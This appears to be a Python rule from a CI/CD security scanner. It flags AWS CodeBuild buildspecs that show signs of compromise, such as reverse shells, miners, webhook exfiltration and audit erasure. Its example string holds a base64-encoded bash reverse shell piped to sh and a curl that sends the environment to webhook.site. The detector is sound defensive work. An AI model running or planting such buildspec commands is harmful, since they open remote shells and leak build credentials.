"""CB-011. CodeBuild buildspec contains indicators of malicious activity."""
from __future__ import annotations

from ..._malicious import find_malicious_patterns
from ...base import Finding, Severity
from ...rule import Rule
from .._catalog import ResourceCatalog

RULE = Rule(
    id="CB-011",
    title="CodeBuild buildspec contains indicators of malicious activity",
    severity=Severity.CRITICAL,
    owasp=("CICD-SEC-4", "CICD-SEC-7"),
    cwe=("CWE-506", "CWE-913"),
    recommendation=(
        "Treat as a potential compromise. Identify which principal or "
        "pipeline ran the CodeBuild project recently, rotate its "
        "service role's credentials, audit CloudTrail for outbound "
        "activity to the matched hosts, and, if an inline buildspec "
        "is in use (CB-008), enforce repo-sourced buildspecs under "
        "branch protection so the next malicious edit requires a PR."
    ),
    docs_note=(
        "Scans the ``source.buildspec`` text on every CodeBuild "
        "project for concrete attack indicators: reverse shells, "
        "base64-decoded execution, miner binaries/pools, Discord/"
        "Telegram webhooks, credential-dump pipes, audit-erasure "
        "commands. CB-011 is CRITICAL by design, a true positive is "
        "evidence of compromise, not a hygiene improvement. Repo-"
        "sourced buildspecs (not inlined) return ``NOT APPLICABLE`` "
        "because the text isn't visible to the scanner; CB-008 "
        "already flags the inline form as a governance gap."
    ),
    known_fp=(
        "Security-training repositories, CTF challenges, and red-team "
        "exercise pipelines legitimately contain reverse-shell strings "
        "or exfil domains as literals. Matches inside YAML keys / HCL "
        "attributes whose names contain ``example``, ``fixture``, "
        "``sample``, ``demo``, or ``test`` are auto-suppressed; bare "
        "lines in a production pipeline still fire.",
        "Defaults to LOW confidence. Filter with ``--min-confidence "
        "MEDIUM`` to ignore all matches; the rule still surfaces the "
        "hit for teams that want to spot-check.",
    ),
    exploit_example=(
        "# Vulnerable: the project's buildspec carries indicators\n"
        "# of malicious activity — base64-decoded execution, exfil\n"
        "# to webhook.site. Either the buildspec was poisoned via\n"
        "# UpdateProject (CB-008) or pulled from a compromised repo.\n"
        "# (current buildspec source)\n"
        "phases:\n"
        "  build:\n"
        "    commands:\n"
        "      - echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | sh\n"
        "      - curl https://webhook.site/abc?env=$(env|base64)\n"
        "\n"
        "# Safe: the buildspec does only what the build needs.\n"
        "# If a check fires here, treat as incident response:\n"
        "# rotate the project's role's credentials, audit recent\n"
        "# builds, identify the commit / UpdateProject call that\n"
        "# introduced the payload.\n"
        "phases:\n"
        "  build:\n"
        "    commands:\n"
        "      - make build\n"
        "      - aws s3 cp build/ s3://artifacts-bucket/ --recursive"
    ),
)


def check(catalog: ResourceCatalog) -> list[Finding]:
    findings: list[Finding] = []
    for project in catalog.codebuild_projects():
        name = project.get("name", "<unnamed>")
        source = project.get("source") or {}
        buildspec = source.get("buildspec") or ""
        if not isinstance(buildspec, str) or not buildspec.strip():
            continue
        # Only inline literal buildspec content has text to scan. A repo
        # path (``ci/build.yml``) or an S3 URL is an external reference the
        # scanner can't read. Inline content is multi-line YAML, a YAML
        # block, or single-line JSON (the shape the API emits inline).
        text = buildspec.strip()
        if text.startswith(("arn:aws:s3:::", "s3://")):
            continue
        if "\n" not in text and not text.startswith(("version:", "phases:", "{")):
            continue
        hits = find_malicious_patterns(buildspec.lower())
        if not hits:
            findings.append(Finding(
                check_id=RULE.id, title=RULE.title, severity=RULE.severity,
                resource=name,
                description=(
                    f"Inline buildspec on project '{name}' has no "
                    "detected indicators of malicious activity."
                ),
                recommendation=RULE.recommendation, passed=True,
            ))
            continue
        categories = sorted({c for c, _n, _e in hits})
        summary = "; ".join(
            f"{n} ({e!r})" for _c, n, e in hits[:3]
        )
        findings.append(Finding(
            check_id=RULE.id, title=RULE.title, severity=RULE.severity,
            resource=name,
            description=(
                f"Inline buildspec on project '{name}' contains "
                f"{len(hits)} indicator(s) of malicious activity "
                f"({', '.join(categories)}). Examples: {summary}"
                f"{'...' if len(hits) > 3 else ''}."
            ),
            recommendation=RULE.recommendation, passed=False,
        ))
    return findings
